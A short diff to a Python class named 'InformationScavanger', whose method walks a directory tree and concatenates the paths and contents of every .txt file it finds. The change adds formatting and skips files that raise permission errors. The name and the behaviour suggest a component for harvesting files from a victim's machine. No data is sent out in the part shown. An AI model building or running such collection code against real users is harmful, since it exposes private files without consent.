@@ -307,10 +307,13 @@ class InformationScavanger:
             for file in files:
                 if file.endswith(".txt"):
                     return_string += os.path.join(root, file)
-                    return_string += "#####################################################\n"
-                    with codecs.open(os.path.join(root, file), 'r', encoding="utf8", errors='ignore') as f:
-                        return_string += '{}'.format(f.read()).encode('utf-8', 'replace').decode()
-                    return_string += "#####################################################\n"
+                    return_string += "\n#####################################################\n"
+                    try:
+                        with codecs.open(r"{}".format(os.path.join(root, file)), 'r', encoding="utf8", errors='ignore') as f:
+                            return_string += '{}'.format(f.read()).encode('utf-8', 'replace').decode()
+                    except PermissionError as p:
+                        continue
+                    return_string += "\n#####################################################\n"
         return return_string
 
     def retriveFiles(self):
